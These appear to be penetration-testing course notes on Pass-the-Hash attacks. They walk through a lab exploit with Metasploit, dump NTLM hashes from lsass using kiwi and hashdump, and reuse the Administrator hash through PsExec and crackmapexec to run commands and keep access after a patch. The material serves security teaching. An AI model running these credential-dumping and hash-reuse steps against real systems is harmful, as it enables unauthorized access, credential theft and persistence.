- When we have obtained NTLM hashes, what can we do with them apart from cracking them?
	- We can perform, what is known as a Pass-The-Hash attack.
- Pass-The-Hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.
- We can use multiple tools to facilitate a Pass-The-Hash attack:
	- Metasploit PsExec Module
	- Crackmapexec
- This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.
- Obtaining a hash could be just as useful as obtaining cleartext passwords, since hashes themselves can also be used for the purpose of authentication.
- Why would I need to authenticate again if I already have access to the target system via a meterpreter session?
	- Since the vulnerability initially exploited to gain access could be patched up, or mitigated using security tools like a firewall, it is always a good idea to save NTLM hashes.

Practical Demonstration
- `service postgresql start && msfconsole`
- `search badblue`
- `set RHOSTS 10.10.10.17`
- `exploit`
- `pgrep lsass`
- `migrate 780`
- `getuid`
- `load kiwi`
- `lsa_dump_sam`
- The above command provides us with the NTLM hashes of all the user accounts on the target system.
- `mimikatz` can also be used instead of `kiwi` to obtain the NTLM hashes of the user accounts.
- `hashdump` can be used to dump the LM hashes of all the users, the LM hash is a common value for all the users on the system.
	- the output of the `hashdump` tool is in the format: `username:sid:LM_Hash:NTLM_Hash`
	- Next, we background the Meterpreter session using (Ctrl+Z).
- Pass-The-Hash Attack using the PsExec Metasploit module
	- In order to use the module, we require the LM hash, in addition to the NTLM or NT hash.
	- `search PsExec`
	- The PsExec module is an authenticated remote code execution module, and as such expects the credentials of the system to perform exploitation on the target system.
	- `use exploit/windows/smb/psexec`
	- `options`
	- `set LPORT 4422`
	- We changed the LPORT since there is already another Meterpreter session running on the default port, 4444.
	- `set RHOSTS 10.10.10.17`
	- `set SMBUser Administrator`
	- `set SMBPass $LM_Hash:$NTLM_HASH`
	- `set target Native\ upload`
	- `exploit`
	- Trying different target values may help in the case the exploit is failing to create a Meterpreter session.
	- Meterpreter Session
		- `sysinfo`
		- `getuid`
		- `exit`
	- `sessions -K`
	- The command above kills all the running sessions, we used it to demonstrate that if we have valid NTLM hashes for the administrator, we do not need to maintain an active shell on the target system to maintain persistence, we can still create a session if the vulnerability initially used to exploit the system has been patched or mitigated.
	- `exploit`
	- Meterpreter Session
		- `sysinfo`
- Pass-The-Hash Attacks using Crackmapexec
	- `crackmapexec smb 10.10.10.17 -u Administrator -H $NTLM_Hash`
	- `crackmapexec smb 10.10.10.17 -u Administrator -H $NTLM_Hash -x "ipconfig"`
	- `crackmapexec smb 10.10.10.17 -u Administrator -H $NTLM_Hash -x "whoami"`
	- `crackmapexec smb 10.10.10.17 -u Administrator -H $NTLM_Hash -x "net user"`
- Other Tools that can be used for Pass-The-Hash Attacks:
	- PsExec Python Script